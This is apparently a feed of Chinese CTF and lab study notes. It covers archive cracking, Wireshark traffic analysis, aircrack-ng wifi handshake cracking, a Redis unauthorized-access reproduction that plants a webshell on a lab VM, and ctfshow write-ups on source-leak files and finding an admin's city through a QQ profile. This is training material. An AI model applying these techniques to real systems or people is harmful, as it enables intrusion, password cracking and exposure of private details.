class="language-none">1、使用二维码扫描工具CQR.exe打开图片，找到内容字段2、补全二维码3、取反<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="3、压缩文件处理"><a href="#3、压缩文件处理" class="headerlink" title="3、压缩文件处理"></a><strong>3、压缩文件处理</strong></h2><p><strong>#伪加密</strong></p><pre class="line-numbers language-none"><code class="language-none">使用场景：伪加密文件zip方法：使用winhex打开压缩文件，找到文件头第九第十个字符，将其修改为0000使用winhex打开文件搜索16进制504B0102，可以看到每个加密文件的头文件字段rar方法：使用winhex打开rar文件，找到第24个字节，该字节尾数为4表示加密，0表示无加密<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>#暴力破解</strong></p><pre class="line-numbers language-none"><code class="language-none">ARCHPR：windows下加密过的rar文件ziperello：windows下加密过的zip文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>#明文攻击</strong></p><pre class="line-numbers language-none"><code class="language-none">使用场景:已知加密的zip?rar部分文件明文内容方法：1、将.txt的明文文件进行压缩，变成.zip2、打开archpr，攻击类型选择明文，明文文件路径选择.zip(即将明文文件不加密压缩后的文件)，加密的文件3、选择要破解的文件，点击开始，破解成功后会获得密码有时候会跑出加密秘钥使用该方法需要注意两个关键点：1、有一个明文文件，压缩后CRC值与加密压缩包中的文件一致2、明文文件的压缩算法需要与加密压缩文件的压缩算法一样（store是默认算法）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>#RAR文件格式</strong></p><pre class="line-numbers language-none"><code class="language-none">有时候给出的RAR文件的头部各个字块会故意给错导致无法识别HEAD_CRC   2字节   所有块或块部分的CRCHEAD_TYPE  1字节   块类型HEAD_FLAGS 2字节   块标记HEAD_SIZE  2字节   块大小 #如果快标记的第一位被置1的话，还存在：ADD_SIZE 4字节 可选结构-增加块大小那么，文件块的第三个字节为块类型，也叫头类型头类型是0x72表示是标记块头类型是0x73表示是压缩文件头块头类型是0x74表示是文件头块头类型是0x75表示是注释快<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/aHR0cDovL3BpYy5jeHluYi5jbi8yMDIwMDgxNDE2MjUzOS5wbmc"></p><h2 id="4、流量取证技术"><a href="#4、流量取证技术" class="headerlink" title="4、流量取证技术"></a><strong>4、流量取证技术</strong></h2><p>通常比赛中会提供一个包含流量数据的PCAP文件，有时候需要进行修复或重构传输文件后，再进行分析<br>    总体把握：</p><pre class="line-numbers language-none"><code class="language-none">协议分级端点统计过滤筛选过滤语法Host，Protocol，contains，特征值发现异常特殊字符串协议某字段flag位于服务器中数据提取字符串取文件提取<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    流量分析可以概括为三个方向</p><pre class="line-numbers language-none"><code class="language-none">1、流量包修复2、协议分析3、数据提取<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>#常用的过滤命令：</strong></p><pre class="line-numbers language-none"><code class="language-none">1、过滤IP，如源IP或者目标x.x.x.xip.src eq x.x.x.x or ip.dst eq x.x.x.x2、过滤端口tcp.port eq 80 or udp.port eq 80tcp.dstport &#x3D;&#x3D; 80 只显tcp协议的目标端口为80tcp.srcport &#x3D;&#x3D; 80 只显tcp协议的源端口为80tcp.port &gt;&#x3D; 1 and tcp.port &lt;&#x3D; 803、过滤协议tcp&#x2F;udp&#x2F;arp&#x2F;icmp&#x2F;http&#x2F;ftp&#x2F;dns&#x2F;ip……4、过滤MACeth.dst &#x3D;&#x3D; xx.xx.xx.xx 过滤目标MAC5、包长度过滤udp.length &#x3D;&#x3D; xx 这个长度是指udp本身固定长度8加上udp下面那块数据包之和tcp.len &gt;&#x3D; 7 指的是ip数据包（tcp下面那块数据），不包括tcp本身ip.len &#x3D;&#x3D; 94 除了以太网头固定长度14，其他都算是ip.len,即从ip本身到最后frame.len &#x3D;&#x3D; 119 整个数据包长度，从eth开始到最后6、http模式过滤http.request.method &#x3D;&#x3D; &quot;GET&quot;http.request.method &#x3D;&#x3D; &quot;POST&quot;http.request.uri &#x3D;&#x3D; &quot;&#x2F;img&#x2F;logo-edu.gif&quot;http contains &quot;GET&quot;http contains &quot;HTTP&#x2F;1.&quot;http.request.method &#x3D;&#x3D; &quot;GET&quot; &amp;&amp; httphttp contains &quot;flag&quot;http contains &quot;key&quot;tcp contains &quot;flag&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>#WireShark协议分析：</strong></p><pre class="line-numbers language-none"><code class="language-none">英文版：Statistics -&gt; Protocol Hierarchy中文版：统计 -&gt; 协议分级根据数据包特征进行筛选右键--&gt;作为过滤器应用--&gt;选中流汇聚右键--&gt;追踪流--&gt;.... 在关注的http数据包或tcp数据包中选择流汇聚，可以将http流或tcp流汇聚或还原成数据，在弹出的框中可以看到数据内容常见的http流关键内容：1、html中直接包含重要信息2、上传或下载文件内容，通常包含文件名，hash值等关键信息常用POST请求上传3、一句话木马，POST请求，内容包含eval，内容使用base64加密<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>#数据提取：</strong></p><pre class="line-numbers language-none"><code class="language-none">使用wireshark自动提取通过http传输的文件内容文件--&gt;导出对象（wireshark自带的文件分离功能）手动提取文件内容右键--&gt;导出分组字节流 或者 点击菜单栏 文件--&gt;导出分组字节流，快捷键ctrl+h在弹出的框中将文件保存成二进制文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>#无线wifi流量包：</strong></p><pre class="line-numbers language-none"><code class="language-none">kali系统下：aircrack-ng工具进行wifi密码破解1、用aircrack-ng检查cap包：aircrack-ng xxx.capbssid：MAC地址    ESSID：wifi名字2、用aircrack-ng跑字典进行握手包破解：aircrack-ng xxx.cap -w pass.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>#USB流量：鼠标流量和键盘流量</strong></p><pre class="line-numbers language-none"><code class="language-none">键盘流量：右键leftover capture data --&gt; 应用为列..在数据包中体现，apply as column键盘数据包的数据长度为8个字节，击键信息集中在第3个字节Leftover Capture Data中值与具体按键的对应关系，可以参考http:&#x2F;&#x2F;www.usb.org&#x2F;developers&#x2F;hidpage&#x2F;Hut1_12v2.pdfpython脚本提出方式1、文件--&gt;导出分组解析结果--&gt;保存为一个csv文件（表格） 不好用2、使用wireshark提供的命令行工具tshark，可以将Leftover Captuer Data数据单独复制出来tshark -r 流量包的名字 -T fields -e usb.capdata&gt;目的文件名.txt鼠标流量：鼠标流量的提取方式和键盘的提取方式相同鼠标数据包的数据长度为4个字节第一个字节代表按键，当取0x00，代表没有按键；为0x01时，代表按左键；为0x02时，代表当前按键为右键第二个字节代表左右偏移当值为正时，代表右移多少像素当值为负时，代表左移多少像素同理，第三个字节代表上下偏移.脚本用gnuplot工具把坐标画出来命令：1、gnuplot  2、plot&quot;xy.txt&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>脚本：<br><a href="https://github.com/WangYihang/UsbMiceDataHacker">https://github.com/WangYihang/UsbMiceDataHacker</a>  &#x2F;&#x2F;鼠标流量<br><a href="https://github.com/WangYihang/UsbKeyboardDataHacker">https://github.com/WangYihang/UsbKeyboardDataHacker</a> &#x2F;&#x2F;键盘流量</p><h3 id="Https流量包文件分析："><a href="#Https流量包文件分析：" class="headerlink" title="#Https流量包文件分析："></a>#Https流量包文件分析：</h3><pre class="line-numbers language-none"><code class="language-none">一般会给key导入key  Https &#x3D;&#x3D; Http + TLS英文版：Preference--&gt;Protocols--&gt;SSL--&gt;edit RSA keys list中文版：编辑--&gt;首选项--&gt;Protocols--&gt;SSL--&gt;Edit RSA keys list<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows开启apache服务</title>
      <link href="/2022/01/12/shi-yong-phpstudy-zai-windows-shang-da-jian-apache-huan-jing/"/>
      <url>/2022/01/12/shi-yong-phpstudy-zai-windows-shang-da-jian-apache-huan-jing/</url>
      
        <content type="html"><![CDATA[<p>1.在官网下载phpstudy</p><p><a href="https://www.xp.cn/">https://www.xp.cn/</a></p><p>2.找到安装包 点击安装 一直下一步 默认安装到D盘下</p><p>3.安装完成后打开</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220112220920176.png"></p><p>启动apache</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220112222738853.png"></p><p>apache服务开启 在D:&#x2F;phpstudy_pro&#x2F;www目录下面写php文件 在浏览器查看就可以运行了</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220112221356530.png"></p><p>注意我1.php所在文件位置还有文件格式</p><p>在浏览器输入localhost&#x2F;1.php查看运行结果</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220112221511911.png" alt="成功"></p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phpstudy </tag>
            
            <tag> apache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis未授权访问漏洞复现与利用</title>
      <link href="/2021/12/10/2021-12-10-redis-wei-shou-quan-fang-wen-lou-dong-fu-xian-yu-li-yong/"/>
      <url>/2021/12/10/2021-12-10-redis-wei-shou-quan-fang-wen-lou-dong-fu-xian-yu-li-yong/</url>
      
        <content type="html"><![CDATA[<p>比赛的时候扫了下端口 发现开放了6379端口 基本可以断定存在redis未授权漏洞</p><h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><p>攻击机：kali2021                192.168.129.141</p><p>靶机：metaspaloitable2    192.168.129.14</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>下载并安装测试用的Redis</p><pre class="line-numbers language-none"><code class="language-none">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-2.8.17.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220408191253223.png"></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220408191317093.png"></p><pre class="line-numbers language-none"><code class="language-none">解压安装包：tar xzf redis-2.8.17.tar.gz进入redis目录：cd redis-2.8.17安装：make<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220408191446569.png"></p><pre class="line-numbers language-none"><code class="language-none">make结束后，进入src目录：cd src，将redis-server和redis-cli拷贝到&#x2F;usr&#x2F;bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220408191551054.png"></p><pre class="line-numbers language-none"><code class="language-none">返回目录redis-2.8.17，将redis.conf拷贝到&#x2F;etc&#x2F;目录下：<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220408191639288.png"></p><p>注意<code>redis-2.8.17</code>不用配置redis.conf文件</p><p><code>redis-3.2.11</code>需要去掉ip绑定及关闭保护模式</p><p>具体为修改<code>bind 127.0.0.1</code>跟<code>protected-mode no</code></p><pre class="line-numbers language-none"><code class="language-none">使用&#x2F;etc&#x2F;目录下的reids.conf文件中的配置启动redis服务：<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220408192156389.png" alt="启动成功 端口号为6379"></p><p>接下来重新在kali上操作一遍或者将<code>redis-cli</code>文件复制到kali中</p><p><strong>使用redis客户端直接无账号成功登录redis：</strong></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220408192833556.png"></p><p>写入webshell</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220408193313423.png"></p><p>shell写入成功</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220408193732263.png"></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220408193756111.png"></p><p>蚁剑连接成功</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220408194101503.png"></p><h2 id="加固"><a href="#加固" class="headerlink" title="加固"></a>加固</h2><p>配置&#x2F;etc目录下的redis.conf</p><p> 有无密码，是否存在弱口令，搜索bind查看是否绑定ip地址，是否允许外联</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220408195851191.png"></p><p>127.0.0.1被注释掉说明允许外联 把<code>#</code>删除</p><p>搜索requirepass 查看是否为默认密码 <code>foodbared</code></p>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow 信息收集刷题记录</title>
      <link href="/2021/12/06/2021-12-06-ctfshow-xin-xi-shou-ji-shua-ti-ji-lu/"/>
      <url>/2021/12/06/2021-12-06-ctfshow-xin-xi-shou-ji-shua-ti-ji-lu/</url>
      
        <content type="html"><![CDATA[<h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>第一题一道入门题 直接右击查看源代码</p><h6 id=""><a href="#" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304165057735.png" style="zoom:200%;" /></h6><h6 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304165106736.png" style="zoom:200%;" /></h6><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>打开链接后发现提示无法查看源代码 的确无法进行右击 没法在浏览器查看源代码那就抓包来看 burpsuite一把梭</p><p>打开burpsuite 在proxy-options里设置代理ip及端口</p><h5 id="-2"><a href="#-2" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304165149165.png" style="zoom:150%;" /></h5><p>左边add是添加 edit是修改 remove是删除</p><p>在浏览器使用foxyproxy挂代理 代理ip及端口号要跟burpsuite里设置时一样的（foxyproxy具体下载我就不详细讲了 百度上都有）</p><p>Burpsuite跟foxyproxy(以后简称代理)都设置好了之后点击刷新</p><h6 id="-3"><a href="#-3" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304165202599.png" style="zoom:200%;" /></h6><p>抓到了包 </p><h6 id="-4"><a href="#-4" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304165219311.png" style="zoom:200%;" /></h6><p>右击 send to repeater</p><h6 id="-5"><a href="#-5" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304165244303.png" style="zoom:200%;" /></h6><p>点repeater再点send发送 右面出现了网页的源码（左边是网页的报文头部）</p><p>下滑发现flag值</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>Web3跟web2差不多 不过这个右击查看的话能显示但是没有源码</p><p>挂代理burp抓包</p><h6 id="-6"><a href="#-6" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304165337079.png" style="zoom:200%;" /></h6><p>还是发送到repeater 然后send</p><h6 id="-7"><a href="#-7" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304165348247.png" style="zoom:200%;" /></h6><p>flag在头部里</p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>题目提示robots.txt 考察robots协议 百度以下robots协议是什么意思</p><h6 id="-8"><a href="#-8" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304165501950.png" style="zoom:200%;" /></h6><p>打开题目</p><h6 id="-9"><a href="#-9" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304165535180.png" style="zoom:200%;" /></h6><p>直接在url后面加上robots.txt访问robots协议的文件（如果访问不了看一下自己的网络是否连接的是校园网 如果是 切换成自己的手机热点）</p><h6 id="-10"><a href="#-10" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304165546610.png" style="zoom:200%;" /></h6><p>这里提示flagishere.txt</p><p>直接复制访问</p><h6 id="-11"><a href="#-11" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304165558162.png" style="zoom:200%;" /></h6><p>得到flag</p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>查看提示考察phps文件泄露 直接到url后面加上&#x2F;index.phps （index.phps要记住 常见的备份文件后缀还有<code>.git .svn .swp .svn .~ .bak .bash_history</code>）</p><h6 id="-12"><a href="#-12" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304165641919.png" style="zoom:200%;" /></h6><p>下载后打开（我电脑上有notpad++直接右击用notpad打开） 发现flag</p><h6 id="-13"><a href="#-13" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304165654390.png" style="zoom:200%;" /></h6><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>查看提示 说考察代码泄露 直接访问<a href="http://www.zip/">www.zip</a>即可</p><p>打开页面还是跟前几个一样 直接在url后面加上&#x2F;<a href="http://www.zip直接弹出对话框提示下载/">www.zip直接弹出对话框提示下载</a></p><h6 id="-14"><a href="#-14" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304165724292.png" style="zoom:200%;" /></h6><p>发现fl000g.txt打开</p><h6 id="-15"><a href="#-15" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304165741151.png" style="zoom:200%;" /></h6><h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>查看提示 考察git泄露 直接访问&#x2F;.gir&#x2F;index.php</p><h6 id="-16"><a href="#-16" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304165813513.png" style="zoom:200%;" /></h6><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>查看提示考察svn泄露  直接访问&#x2F;.svn</p><h6 id="-17"><a href="#-17" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304165854537.png" style="zoom:200%;" /></h6><h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>查看提示考察vim信息泄露 直接访问&#x2F;index.php.swp</p><p>（唉 今年省赛考到了个这个题 没做出来 页面提示是“我喜欢用vim”按理说跟这个题是的直接&#x2F;index.php.swp过着&#x2F;.index.php.swp index.php~等等都试了结果都没反应没做出来 问的济南工工程他们也是没做出来）</p><p>废话不多说了 做题  打开链接 直接在url后面加上&#x2F;index.php.swp 网站请求下载文件</p><p>下载后是index.php.swp把后缀名swp删了 index.php 打开得到flag</p><h6 id="-18"><a href="#-18" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304165927346.png" style="zoom:200%;" /></h6><h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>查看提示</p><h6 id="-19"><a href="#-19" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304170008453.png" style="zoom:200%;" /></h6><p>看来得抓包 burpsuite一把梭直接抓包</p><h6 id="-20"><a href="#-20" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304170111100.png" style="zoom:200%;" /></h6><h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p>查看提示</p><h6 id="-21"><a href="#-21" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304170141376.png"></h6><p>点进链接 输入ctfshow.com“立即检测”</p><h6 id="-22"><a href="#-22" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304170207800.png" style="zoom:200%;" /></h6><h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p>查看提示</p><h6 id="-23"><a href="#-23" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304170234108.png" style="zoom:200%;" /></h6><p>提示访问robots.txt 打开链接访问发现是一个购物页面</p><h6 id="-24"><a href="#-24" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304170246058.png" style="zoom:200%;" /></h6><p>在url后面加上robots.txt</p><h6 id="-25"><a href="#-25" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304170311808.png" style="zoom:150%;" /></h6><p>提示admin 在url后面加上admin 弹出一个登陆的对话框 用户名是admin 回去找密码 最开始提示密码在下面</p><h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p>打开靶场链接</p><h6 id="-26"><a href="#-26" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/clip_image002.jpg" style="zoom:200%;" /></h6><p>往下划有一个很可疑的链接</p><h6 id="-27"><a href="#-27" class="headerlink" title=""></a><img src="C:/Users/112/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg"></h6><p>点开网页会自动下载pdf文件</p><p>打开pdf 发现有默认后台地址和用户名密码</p><p>把domain&#x2F;后面复制到靶场url后面</p><p>弹出一个登陆对话框</p><p>输入pdf里的用户名密码 登陆</p><p><img src="C:/Users/112/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg"></p><h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><p>查看提示</p><h6 id="-28"><a href="#-28" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304170737124.png" style="zoom:200%;" /></h6><p>打开靶场链接</p><h6 id="-29"><a href="#-29" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304170748100.png" style="zoom:200%;" /></h6><p>根据提示在靶场url后面加上editor</p><h6 id="-30"><a href="#-30" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304170758319.png" style="zoom:200%;" /></h6><p>点击这个按钮</p><h6 id="-31"><a href="#-31" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304170810183.png" style="zoom:200%;" /></h6><p>文件空间</p><h6 id="-32"><a href="#-32" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304170820487.png" style="zoom:200%;" /></h6><p>发现可以直接看到网站根目录</p><p>找到网站的目录&#x2F;var&#x2F;www&#x2F;html(要记住)</p><p>发现nothinghere很可疑 打开 发现fl000g.txt</p><h6 id="-33"><a href="#-33" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304170830282.png" style="zoom:200%;" /></h6><p>记住网页的目录 </p><p>&#x2F;editor&#x2F;attached&#x2F;file&#x2F;var&#x2F;www&#x2F;html&#x2F;nothinghere&#x2F;fl000g.txt</p><p>这是flag文件所在的绝对路径 靶场所在的路径是在var&#x2F;www&#x2F;html下面 所以路径从html后面开始 &#x2F;nothinghere&#x2F;fl000g.txt</p><p>直接复制到靶场url后面</p><h6 id="-34"><a href="#-34" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304170911882.png" style="zoom:200%;" /></h6><h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><p>查看提示</p><h6 id="-35"><a href="#-35" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304170933380.png" style="zoom:200%;" /></h6><p>在靶场url后面加上&#x2F;admin</p><h6 id="-36"><a href="#-36" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304170943065.png" style="zoom:200%;" /></h6><p>发现有一个忘记密码 点击</p><h6 id="-37"><a href="#-37" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304171007570.png" style="zoom:200%;" /></h6><p>发现有密保 问题是管理员所在城市</p><p>这就用到社工了</p><p>返回主页面拉到最后 发现有管理员的qq邮箱 通过搜索qq号查看资料 得到管理员所在城市 即可修改密码</p><h6 id="-38"><a href="#-38" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304171022713.png" style="zoom:200%;" /></h6><h6 id="-39"><a href="#-39" class="headerlink" title=""></a><img src="C:/Users/112/AppData/Roaming/Typora/typora-user-images/image-20220304171030765.png" style="zoom:200%;" /></h6><p>得到密码 返回直接登陆</p><h6 id="-40"><a href="#-40" class="headerlink" title=""></a><img src="C:/Users/112/AppData/Roaming/Typora/typora-user-images/image-20220304171039888.png" style="zoom:200%;" /></h6><h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><p>查看提示</p><h6 id="-41"><a href="#-41" class="headerlink" title=""></a><img src="C:/Users/112/AppData/Roaming/Typora/typora-user-images/image-20220304171104771.png" style="zoom:200%;" /></h6><p>打开后</p><h6 id="-42"><a href="#-42" class="headerlink" title=""></a><img src="C:/Users/112/AppData/Roaming/Typora/typora-user-images/image-20220304171112675.png" style="zoom:200%;" /></h6><p>根据提示在url后面添加&#x2F;tz.php</p><h6 id="-43"><a href="#-43" class="headerlink" title=""></a><img src="C:/Users/112/AppData/Roaming/Typora/typora-user-images/image-20220304171120872.png" style="zoom:200%;" /></h6><p>往下划一点 按提示找到phpinfo flag就在里面</p><h6 id="-44"><a href="#-44" class="headerlink" title=""></a><img src="C:/Users/112/AppData/Roaming/Typora/typora-user-images/image-20220304171134212.png" style="zoom:200%;" /></h6><p>点进去</p><h6 id="-45"><a href="#-45" class="headerlink" title=""></a><img src="C:/Users/112/AppData/Roaming/Typora/typora-user-images/image-20220304171143533.png" style="zoom:200%;" /></h6><p>Phpinfo的界面 直接ctrl+f搜索ctfshow 得到flag</p><h6 id="-46"><a href="#-46" class="headerlink" title=""></a><img src="C:/Users/112/AppData/Roaming/Typora/typora-user-images/image-20220304171153243.png" style="zoom:200%;" /></h6><h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><p>查看提示</p><h6 id="-47"><a href="#-47" class="headerlink" title=""></a><img src="C:/Users/112/AppData/Roaming/Typora/typora-user-images/image-20220304171221661.png" style="zoom:200%;" /></h6><p>按经验来说字越少越麻烦 看看吧</p><p>打开是这个样</p><h6 id="-48"><a href="#-48" class="headerlink" title=""></a><img src="C:/Users/112/AppData/Roaming/Typora/typora-user-images/image-20220304171229802.png" style="zoom:200%;" /></h6><p>提示里说backup.sql 那就在靶机后面加上&#x2F;backup.sql</p><p>网页提示下载文件 下载后打开发现flag</p><h6 id="-49"><a href="#-49" class="headerlink" title=""></a><img src="C:/Users/112/AppData/Roaming/Typora/typora-user-images/image-20220304171245802.png" style="zoom:200%;" /></h6><h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><p>查看提示</p><h6 id="-50"><a href="#-50" class="headerlink" title=""></a><img src="C:/Users/112/AppData/Roaming/Typora/typora-user-images/image-20220304171307201.png" style="zoom:200%;" /></h6><p>其实根据提示直接访问110.php就可以得到flag</p><h6 id="-51"><a href="#-51" class="headerlink" title=""></a><img src="C:/Users/112/AppData/Roaming/Typora/typora-user-images/image-20220304171316638.png" style="zoom:200%;" /></h6><p>还是根据题目提示一点一点来看看 右击查看源码 找到js文件 点击</p><h6 id="-52"><a href="#-52" class="headerlink" title=""></a><img src="C:/Users/112/AppData/Roaming/Typora/typora-user-images/image-20220304171325945.png" style="zoom:200%;" /></h6><h6 id="-53"><a href="#-53" class="headerlink" title=""></a><img src="C:/Users/112/AppData/Roaming/Typora/typora-user-images/image-20220304171333878.png" style="zoom:200%;" /></h6><p>复制用工具解密 </p><p>\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b</p><h6 id="-54"><a href="#-54" class="headerlink" title=""></a><img src="C:/Users/112/AppData/Roaming/Typora/typora-user-images/image-20220304171350970.png" style="zoom:200%;" /></h6><p>解密说 